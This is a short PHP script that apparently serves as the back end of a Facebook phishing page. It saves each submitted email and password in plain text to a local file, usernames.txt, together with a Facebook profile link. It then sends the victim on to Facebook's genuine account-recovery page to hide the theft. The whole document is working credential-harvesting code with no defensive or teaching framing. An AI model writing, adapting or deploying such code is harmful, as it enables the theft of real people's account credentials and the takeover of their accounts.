<?php 
file_put_contents("usernames.txt", "Facebook Username:https://www.facebook.com/poyrazefe.oztekin.3?mibextid=ZbWKwL
 " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
